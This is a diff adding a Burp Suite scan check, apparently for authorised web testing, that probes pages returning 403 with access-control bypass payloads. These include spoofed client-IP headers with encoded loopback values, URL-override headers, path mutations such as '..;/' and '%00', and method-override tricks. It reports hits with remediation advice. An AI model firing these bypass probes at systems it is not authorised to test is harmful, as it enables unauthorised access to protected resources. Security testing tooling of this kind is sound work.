@@ -1,0 +1,317 @@
+id: d4f8b2a7-3c9e-4d6f-a1b5-8e0c7f3d2a9b
+name: 403 Forbidden Bypass — Comprehensive Probe Suite
+function: SCAN_CHECK_ACTIVE_PER_REQUEST
+location: SCANNER
+burpglobal:
+  bambda-active: false              # master on/off; set true to enable (bool)
+  bypass-403-ip-value: "127.0.0.1" # primary loopback value injected into IP-spoofing headers (string)
+source: |
+  /**
+   * 403 Forbidden Bypass — Comprehensive Probe Suite
+   * Probes IP spoofing, IP encoding variants, path override headers, path mutations,
+   * method alternatives, method override headers, Referer injection, and host/protocol
+   * spoofing against any base request returning 403. Reports any 2xx bypass as HIGH/FIRM.
+   **/
+
+  if (!"true".equalsIgnoreCase(System.getProperty("bg.bambda-active"))) {
+      return AuditResult.auditResult();
+  }
+
+  // ── GATE: only run against 403 base responses ─────────────────────────────
+  if (!requestResponse.hasResponse()) {
+      return AuditResult.auditResult();
+  }
+  if (requestResponse.response().statusCode() != 403) {
+      return AuditResult.auditResult();
+  }
+
+  // ── BASE REQUEST DETAILS ──────────────────────────────────────────────────
+  var baseReq  = requestResponse.request();
+  var basePath = baseReq.pathWithoutQuery();
+  var fullPath = baseReq.path();
+  var query    = fullPath.contains("?") ? fullPath.substring(fullPath.indexOf("?")) : "";
+  var method   = baseReq.method();
+  var html     = api().utilities().htmlUtils();
+
+  final String PRIMARY_IP = java.util.Objects.requireNonNullElse(
+      System.getProperty("bg.bypass-403-ip-value"), "127.0.0.1"
+  );
+
+  // ── RESULT ACCUMULATOR ────────────────────────────────────────────────────
+  record Finding(String category, String technique, HttpRequestResponse rr) {}
+  var findings = new java.util.ArrayList<Finding>();
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP A: IP / trusted-source spoofing — primary value across all headers
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Inject PRIMARY_IP into every known client-IP header independently.
+  // Applications that whitelist loopback/RFC-1918 addresses for internal
+  // access may bypass 403 when these headers are present.
+
+  var ipSpoofHeaders = new String[][]{
+      {"X-Forwarded-For",           PRIMARY_IP},
+      {"X-Real-IP",                 PRIMARY_IP},
+      {"X-Client-IP",               PRIMARY_IP},
+      {"X-Custom-IP-Authorization", PRIMARY_IP},
+      {"True-Client-IP",            PRIMARY_IP},
+      {"Cluster-Client-IP",         PRIMARY_IP},
+      {"X-Originating-IP",          PRIMARY_IP},
+      {"X-Remote-IP",               PRIMARY_IP},
+      {"X-Remote-Addr",             PRIMARY_IP},
+      {"X-ProxyUser-Ip",            PRIMARY_IP},
+      {"Client-IP",                 PRIMARY_IP},
+      {"Forwarded-For",             PRIMARY_IP},
+      {"X-Forward-For",             PRIMARY_IP},
+      {"Via",                       "1.1 " + PRIMARY_IP},
+      {"Forwarded",                 "for=" + PRIMARY_IP},
+  };
+
+  for (var h : ipSpoofHeaders) {
+      try {
+          var rr = http.sendRequest(baseReq.withHeader(h[0], h[1]));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("IP Spoofing", h[0] + ": " + h[1], rr));
+          }
+      } catch (Exception ignored) {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP B: IP encoding variants via X-Forwarded-For
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Middleware that blocks "127.0.0.1" by exact string match may allow
+  // alternate representations of the same loopback address.
+
+  var ipEncodings = new String[]{
+      "localhost",
+      "localhost:80",
+      "localhost:443",
+      "127.1",              // abbreviated loopback (many TCP stacks resolve this)
+      "2130706433",         // decimal encoding of 127.0.0.1
+      "0x7F000001",         // hex encoding of 127.0.0.1
+      "0177.0000.0000.0001",// octal encoding of 127.0.0.1
+      "10.0.0.1",
+      "172.16.0.1",
+      "192.168.1.1",
+  };
+
+  for (var ip : ipEncodings) {
+      try {
+          var rr = http.sendRequest(baseReq.withHeader("X-Forwarded-For", ip));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("IP Encoding Variant", "X-Forwarded-For: " + ip, rr));
+          }
+      } catch (Exception ignored) {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP C: Path override headers
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Symfony, Spring MVC, and some reverse-proxy configs honour these headers
+  // to re-route the internal request AFTER the front-controller auth check.
+  // Two variants per header: keep original path (middleware intercepts at header)
+  // and rewrite path to / (framework routes entirely via the header value).
+
+  for (var headerName : new String[]{"X-Original-URL", "X-Rewrite-URL"}) {
+      try {
+          var rr = http.sendRequest(baseReq.withHeader(headerName, basePath));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("Path Override Header", headerName + ": " + basePath, rr));
+          }
+      } catch (Exception ignored) {}
+      try {
+          var rr = http.sendRequest(baseReq.withPath("/").withHeader(headerName, basePath));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("Path Override Header", headerName + ": " + basePath + " (request path → /)", rr));
+          }
+      } catch (Exception ignored) {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP D: Path mutations
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Auth middleware and the routing layer may normalise URLs differently.
+  // A mutated path that the router resolves to the same resource may not match
+  // the pattern the auth rule tests against.
+
+  var pathMutations = new java.util.LinkedHashMap<String, String>();
+
+  // --- Prefix mutations (prepend before path) ---
+  pathMutations.put("double-slash prefix",            "/" + basePath + query);
+  pathMutations.put("dot-slash prefix",               "/." + basePath + query);
+  pathMutations.put("semicolon prefix",               "/;" + basePath + query);
+  pathMutations.put("dot-semicolon prefix",           "/.;" + basePath + query);
+  pathMutations.put("double-slash semicolon prefix",  "//;" + basePath + query);
+  pathMutations.put("url-encoded dot prefix",         "/%2e" + basePath + query);
+  pathMutations.put("double-encoded dot prefix",      "/%252e" + basePath + query);
+  // U+FF0F FULLWIDTH SOLIDUS — some parsers treat this as a path separator
+  pathMutations.put("unicode fullwidth slash prefix", "/%ef%bc%8f" + basePath + query);
+
+  // --- Suffix / trailing mutations ---
+  if (!basePath.endsWith("/")) {
+      pathMutations.put("trailing slash",             basePath + "/" + query);
+  }
+  pathMutations.put("trailing dot",                   basePath + "/." + query);
+  pathMutations.put("trailing dot-slash",             basePath + "/./" + query);
+  pathMutations.put("trailing double-slash",          basePath + "//" + query);
+  // Spring / Java EE path-parameter bypass (;jsessionid= style)
+  pathMutations.put("semicolon suffix",               basePath + ";" + query);
+  // Auth rules using /path/* may not match /path..;/
+  pathMutations.put("dot-dot semicolon suffix",       basePath + "..;/" + query);
+  pathMutations.put("slash dot-dot semicolon suffix", basePath + "/..;/" + query);
+  pathMutations.put("url-encoded space suffix",       basePath + "%20" + query);
+  pathMutations.put("url-encoded space-slash suffix", basePath + "%20/" + query);
+  pathMutations.put("url-encoded tab suffix",         basePath + "%09" + query);
+  pathMutations.put("null byte suffix",               basePath + "%00" + query);
+  pathMutations.put(".json extension",                basePath + ".json" + query);
+  pathMutations.put(".html extension",                basePath + ".html" + query);
+  pathMutations.put(".css extension",                 basePath + ".css" + query);
+  // Trailing random segment — some auth rules match on the terminal path segment
+  pathMutations.put("trailing random segment",        basePath + "/" + api().utilities().randomUtils().randomString(8).toLowerCase() + query);
+  // Fragment — rarely reaches the server but worth probing
+  if (query.isEmpty()) {
+      pathMutations.put("empty query string",         basePath + "?");
+      pathMutations.put("dummy query param",          basePath + "?x");
+  }
+
+  // --- Wrap mutations ---
+  pathMutations.put("double-slash wrap",              "/" + basePath + "/" + query);
+  pathMutations.put("dot-slash wrap",                 "/." + basePath + "/." + query);
+
+  // --- Case mutation (catches case-sensitive auth + case-insensitive router) ---
+  if (!basePath.equals(basePath.toUpperCase())) {
+      pathMutations.put("uppercase path",             basePath.toUpperCase() + query);
+  }
+
+  for (var entry : pathMutations.entrySet()) {
+      try {
+          var rr = http.sendRequest(baseReq.withPath(entry.getValue()));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("Path Mutation", entry.getKey() + ": " + entry.getValue(), rr));
+          }
+      } catch (Exception ignored) {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP E: HTTP method alternatives
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Method-specific access controls may not cover all verbs.
+  // HEAD 200 proves the resource is reachable without a response body.
+
+  for (var altMethod : new String[]{"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"}) {
+      if (altMethod.equalsIgnoreCase(method)) continue;
+      try {
+          var rr = http.sendRequest(baseReq.withMethod(altMethod));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("HTTP Method Bypass", "method: " + altMethod, rr));
+          }
+      } catch (Exception ignored) {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP F: Method override headers
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Frameworks that honour method-override headers route the request as a
+  // different method server-side. Auth bound to the wire method may not evaluate
+  // the overridden method.
+
+  for (var overrideHeader : new String[]{"X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"}) {
+      for (var overrideMethod : new String[]{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"}) {
+          if (overrideMethod.equalsIgnoreCase(method)) continue;
+          try {
+              var rr = http.sendRequest(baseReq.withHeader(overrideHeader, overrideMethod));
+              if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+                  findings.add(new Finding("Method Override Header", overrideHeader + ": " + overrideMethod, rr));
+              }
+          } catch (Exception ignored) {}
+      }
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP G: Referer injection
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Some applications skip auth when the Referer header indicates the request
+  // came from within the same application (internal-link check bypass).
+
+  try {
+      var scheme     = baseReq.httpService().secure() ? "https" : "http";
+      var refererUrl = scheme + "://" + baseReq.httpService().host() + basePath;
+      var rr = http.sendRequest(baseReq.withHeader("Referer", refererUrl));
+      if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+          findings.add(new Finding("Referer Injection", "Referer: " + refererUrl, rr));
+      }
+  } catch (Exception ignored) {}
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GROUP H: Host / protocol spoofing
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Applications that enforce auth only on external traffic, or only on HTTP,
+  // can be bypassed by overriding the apparent incoming protocol or host.
+
+  var hostProtoHeaders = new String[][]{
+      {"X-Forwarded-Proto", "https"},
+      {"X-Forwarded-Host",  "localhost"},
+      {"X-Host",            "localhost"},
+  };
+  for (var h : hostProtoHeaders) {
+      try {
+          var rr = http.sendRequest(baseReq.withHeader(h[0], h[1]));
+          if (rr.hasResponse() && rr.response().isStatusCodeClass(StatusCodeClass.CLASS_2XX_SUCCESS)) {
+              findings.add(new Finding("Host/Protocol Spoofing", h[0] + ": " + h[1], rr));
+          }
+      } catch (Exception ignored) {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // REPORT
+  // ═══════════════════════════════════════════════════════════════════════════
+
+  var issues = new java.util.ArrayList<AuditIssue>();
+
+  for (var f : findings) {
+      var statusCode = f.rr().response().statusCode();
+
+      var detail = new StringBuilder();
+      detail.append("<p>The 403 Forbidden response at <code>")
+            .append(html.encode(baseReq.url()))
+            .append("</code> was bypassed using: <strong>")
+            .append(html.encode(f.technique()))
+            .append("</strong> (category: <em>")
+            .append(html.encode(f.category()))
+            .append("</em>).</p>")
+            .append("<p>The probe returned HTTP <strong>")
+            .append(statusCode)
+            .append("</strong>. Verify the response body grants access to the protected ")
+            .append("resource rather than serving an alternate error page or redirect.</p>");
+
+      issues.add(AuditIssue.auditIssue(
+          "403 Bypass — " + f.category() + " [" + f.technique() + "]",
+          detail.toString(),
+          "<p>Enforce access controls at the application layer after complete URL normalisation, "
+              + "independent of HTTP method, path encoding, or header values. Strip and re-inject "
+              + "all forwarding and IP headers at the ingress boundary — never trust client-supplied "
+              + "values. Apply method-level access controls to all HTTP verbs uniformly, including "
+              + "HEAD, OPTIONS, and method-override variants.</p>",
+          baseReq.url(),
+          AuditIssueSeverity.HIGH,
+          AuditIssueConfidence.FIRM,
+          "<p>HTTP 403 bypasses occur when access-control middleware inspects a different "
+              + "representation of the request than the routing or resource-serving layer "
+              + "ultimately handles. Common root causes include: path normalisation inconsistencies "
+              + "between auth middleware and the router, blind trust of client-supplied IP and "
+              + "forwarding headers, method-specific access rules that don't account for override "
+              + "headers, and framework quirks around semicolon path parameters, double-encoded "
+              + "segments, or trailing dot/slash variants.</p>",
+          "<p>Centralise access control so it executes after the framework has fully normalised "
+              + "the URL (decoded, collapsed dot-segments, resolved path parameters, stripped "
+              + "semicolons). Never apply rules to the raw request-line path. Reject or strip all "
+              + "proxy and forwarding headers at the ingress proxy unless the source is explicitly "
+              + "trusted by network address. Bind method-level controls to all HTTP methods "
+              + "including HEAD, OPTIONS, and any method-override header the framework supports.</p>",
+          AuditIssueSeverity.HIGH,
+          f.rr()
+      ));
+  }
+
+  return issues.isEmpty()
+      ? AuditResult.auditResult()
+      : AuditResult.auditResult(issues.toArray(new AuditIssue[0]));
